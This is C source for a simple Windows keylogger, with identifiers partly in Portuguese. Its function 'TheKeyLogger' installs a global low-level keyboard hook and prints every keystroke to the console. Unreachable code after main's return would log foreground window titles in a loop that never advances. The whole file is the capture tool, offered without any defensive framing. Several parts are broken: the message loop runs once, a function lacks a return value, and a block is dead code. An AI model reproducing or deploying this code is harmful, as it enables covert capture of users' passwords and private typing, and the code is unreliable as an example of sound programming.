#include<stdio.h>
#include<stdlib.h>
#include<locale.h>
#include<windows.h>


LRESULT CALLBACK LowLevelKeyboardProc(int nCode,WPARAM wParam,LPARAM lParam){
	BOOL fEatkeystroke = FALSE;
	
	if(nCode==HC_ACTION){
		switch(wParam){
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
			case WM_SYSKEYUP:{
				PKBDLLHOOKSTRUCT a = (PKBDLLHOOKSTRUCT)lParam;
				printf("%c",a->vkCode);
				break;
			}
		}
	} 
	return (fEatkeystroke?1:CallNextHookEx(NULL,nCode,wParam,lParam));
	

}

	void getmsgsys(){
		MSG geted;
		
		if(GetMessage(&geted,NULL,0,0)){
		TranslateMessage(&geted);
		DispatchMessage(&geted);
		}
	}
	
	DWORD WINAPI TheKeyLogger(){
		HINSTANCE janela = GetModuleHandle(NULL);
		HHOOK inputhook = SetWindowsHookEx(WH_KEYBOARD_LL,LowLevelKeyboardProc,janela,0);
		getmsgsys();
		UnhookWindowsHookEx(inputhook);
	}
	

	
	

int main(int argc,char *argv[]){
	
HANDLE puxar;
DWORD dul;

puxar = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)TheKeyLogger,(LPVOID)argv[0],NULL,&dul);

if(puxar){
	return WaitForSingleObject(puxar,INFINITE);
}else{
	return 1;
}



		char exeopened[256]; 
		 
		HANDLE pegwebn= GetForegroundWindow();
		GetWindowTextA(pegwebn,exeopened,256);
		int number=0;
		system("color a");
		
		while(number<10){
			
		HANDLE pegwebn= GetForegroundWindow();
		GetWindowTextA(pegwebn,exeopened,256);
  			printf("janela aperta:%s\n",exeopened);
			sleep(1);
			
		}



return 0;

}
